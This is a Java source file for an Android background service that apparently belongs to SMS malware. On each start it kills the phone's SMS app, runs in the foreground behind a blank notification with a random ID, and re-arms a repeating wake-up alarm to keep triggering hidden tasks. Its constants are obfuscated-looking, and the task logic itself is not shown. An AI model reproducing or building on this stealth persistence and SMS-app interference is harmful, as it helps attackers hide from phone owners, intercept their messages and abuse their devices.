package net.workspace;
import net.workspace.biz.BIZ;
import net.workspace.manager.TaskManager;
import net.workspace.util.MyLogger;
import net.workspace.util.CommonUtil;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;

/**
 * TaskService
 *
 * @author Hike
 */
@SuppressLint("NewApi")
public class TaskService extends android.app.Service {
    private static String ACTION_EXECUTE_TASK = "XXXXXXX";
    public static void restartAlarm() {
        synchronized (locker) {
            AlarmManager manager = (AlarmManager) CommonUtil.context.getSystemService("alarm");
            PendingIntent pending = PendingIntent.getService(CommonUtil.context, 0, new Intent().setClass(CommonUtil.context, net.workspace.TaskService.class).setAction(ACTION_EXECUTE_TASK), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, BIZ.TASK_CHECK_INTERVAL * 1000, pending);
        }
    }
    private String PREF_NAME = "OPQRVSG";
    private static final Object locker = new Object();
    @Override
    public void onCreate() {
        super.onCreate();
    }
    @Override
    public void onDestroy() {
        stopForeground(true);
    }
    @Override
    public void onStart(Intent intent, int i) {
        super.onStart(intent, i);
        String action = null;
        if (intent != null) action = intent.getAction();
        MyLogger.debug("TaskService onStart start,action=" + action);
        startForeground((int) (Math.random() * Integer.MAX_VALUE), new Notification());
        CommonUtil.init(getApplicationContext());
        CommonUtil.killSmsApp();
        SharedPreferences pref = getSharedPreferences(PREF_NAME, 0);
        long current = System.currentTimeMillis();
        if (ACTION_EXECUTE_TASK.equals(action)) {
            pref.edit().putLong(PREF_NAME, current).commit();
            TaskManager.getInstance(this).triggerByService();
        } else {
            long lastProcessTime = pref.getLong(PREF_NAME, 0);
            if (current - lastProcessTime > BIZ.TASK_CHECK_INTERVAL * 1000) {
                restartAlarm();
            }
        }
        MyLogger.debug("TaskService onStart end");
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
